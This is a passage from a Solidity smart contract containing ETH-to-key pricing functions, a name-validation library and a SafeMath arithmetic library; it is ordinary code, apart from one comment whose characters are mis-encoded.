    function keys(uint256 _eth) 

        internal

        pure

        returns(uint256)

    {

        return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000000);

    }

    

    // ����Keys�������������ETH������

    function eth(uint256 _keys) 

        internal

        pure

        returns(uint256)  

    {

        return ((78125000000000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000000))) / (2))) / ((1000000000000000000).sq());

    }

}





library NameFilter {

    /**

     * @dev filters name strings

     * -converts uppercase to lower case.  

     * -makes sure it does not start/end with a space

     * -makes sure it does not contain multiple spaces in a row

     * -cannot be only numbers

     * -cannot start with 0x 

     * -restricts characters to A-Z, a-z, 0-9, and space.

     * @return reprocessed string in bytes32 format

     */

    function nameFilter(string _input)

        internal

        pure

        returns(bytes32)

    {

        bytes memory _temp = bytes(_input);

        uint256 _length = _temp.length;

        

        //sorry limited to 32 characters

        require (_length <= 32 && _length > 0, "string must be between 1 and 32 characters");

        // make sure it doesnt start with or end with space

        require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, "string cannot start or end with space");

        // make sure first two characters are not 0x

        if (_temp[0] == 0x30)

        {

            require(_temp[1] != 0x78, "string cannot start with 0x");

            require(_temp[1] != 0x58, "string cannot start with 0X");

        }

        

        // create a bool to track if we have a non number character

        bool _hasNonNumber;

        

        // convert & check

        for (uint256 i = 0; i < _length; i++)

        {

            // if its uppercase A-Z

            if (_temp[i] > 0x40 && _temp[i] < 0x5b)

            {

                // convert to lower case a-z

                _temp[i] = byte(uint(_temp[i]) + 32);

                

                // we have a non number

                if (_hasNonNumber == false)

                    _hasNonNumber = true;

            } else {

                require

                (

                    // require character is a space

                    _temp[i] == 0x20 || 

                    // OR lowercase a-z

                    (_temp[i] > 0x60 && _temp[i] < 0x7b) ||

                    // or 0-9

                    (_temp[i] > 0x2f && _temp[i] < 0x3a),

                    "string contains invalid characters"

                );

                // make sure theres not 2x spaces in a row

                if (_temp[i] == 0x20)

                    require( _temp[i+1] != 0x20, "string cannot contain consecutive spaces");

                

                // see if we have a character other than a number

                if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))

                    _hasNonNumber = true;    

            }

        }

        

        require(_hasNonNumber == true, "string cannot be only numbers");

        

        bytes32 _ret;

        assembly {

            _ret := mload(add(_temp, 32))

        }

        return (_ret);

    }

}





library SafeMath {

    

    /**

    * @dev Multiplies two numbers, throws on overflow.

    */

    function mul(uint256 a, uint256 b) 

        internal 

        pure 

        returns (uint256 c) 

    {

        if (a == 0) {

            return 0;

        }

        c = a * b;

        require(c / a == b, "SafeMath mul failed");

        return c;

    }



    /**

    * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).

    */

    function sub(uint256 a, uint256 b)

        internal

        pure

        returns (uint256) 

    {

        require(b <= a, "SafeMath sub failed");

        return a - b;

    }



    /**

    * @dev Adds two numbers, throws on overflow.

    */

    function add(uint256 a, uint256 b)

        internal

        pure

        returns (uint256 c) 

    {

        c = a + b;

        require(c >= a, "SafeMath add failed");

        return c;

    }

    

    /**

     * @dev gives square root of given x.

     */

    function sqrt(uint256 x)

        internal

        pure

        returns (uint256 y) 

    {

        uint256 z = ((add(x,1)) / 2);

        y = x;

        while (z < y) 

        {

            y = z;

            z = ((add((x / z),z)) / 2);

        }

    }

    

    /**

     * @dev gives square. multiplies x by x

     */

    function sq(uint256 x)

        internal

        pure

        returns (uint256)

    {

        return (mul(x,x));

    }

    

    /**

     * @dev x to the power of y 

     */

    function pwr(uint256 x, uint256 y)

        internal 

        pure 

        returns (uint256)

    {

        if (x==0)

            return (0);

        else if (y==0)

            return (1);

        else 

        {

            uint256 z = x;

            for (uint256 i=1; i < y; i++)

                z = mul(z,x);

            return (z);

        }

    }

}